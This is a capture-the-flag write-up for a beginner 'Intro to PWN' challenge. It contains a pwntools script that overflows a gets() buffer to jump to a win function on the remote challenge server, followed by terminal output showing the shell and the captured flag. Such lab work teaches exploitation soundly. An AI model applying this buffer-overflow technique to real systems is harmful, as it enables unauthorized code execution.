## Training Problem: Intro to PWN

### 153

training

Classic win function pwn.

-ProfNinja

(I originally released this with a canary, took away the canary and redployed the service. If your binary has a canary download again.)

`nc 0.cloud.chals.io 13545`



### Solution
- exploit.py
```python

'''
gets : rbp - 0x30

win address = 0x004011b6
'''

from pwn import *

context.binary = binary = ELF("./pwnme" , checksec = False)
# context.log_level = "debug"

win_address = p64(binary.symbols.win)
ret_address = p64(0x000000000040101a)
								
								
payload = b'A' * (0x30) + b'B' * 8 +ret_address +  win_address

# p = process()
p = remote("0.cloud.chals.io", 13545)
p.sendline(payload)
p.recv()
p.interactive()

```



```terminal

┌──(kali㉿kali)-[~/CTF/UDCTF/pwn/Training Problem: Intro to PWN]
└─$ python3 exploit.py
[+] Opening connection to 0.cloud.chals.io on port 13545: Done
[*] Switching to interactive mode
$ ls
flag.txt
pwnme
$ cat flag.txt
udctf{h00r4y_I_am_a_pwn3r_n0w}

```
